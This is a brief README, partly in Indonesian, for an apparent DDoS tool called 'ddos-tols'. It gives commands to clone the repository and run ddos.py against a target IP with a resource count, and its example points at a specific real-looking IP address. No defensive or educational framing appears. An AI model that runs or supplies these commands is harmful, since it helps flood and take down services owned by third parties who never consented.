# DDOS TOLS ERROR CODE

## 1. Download Script
- <code>git clone https://www.github.com/firdaus-rx/ddos-tols</code>
- <code>cd ddos-tols</code>

## 2. Jalankan Tols 
- <code>python2 ddos.py -t [IP_TARGET] -r [--resource]</code>

## 3. Example 
- <code>python2 ddos.py -t 141.124.13.12 -r 1000</code>
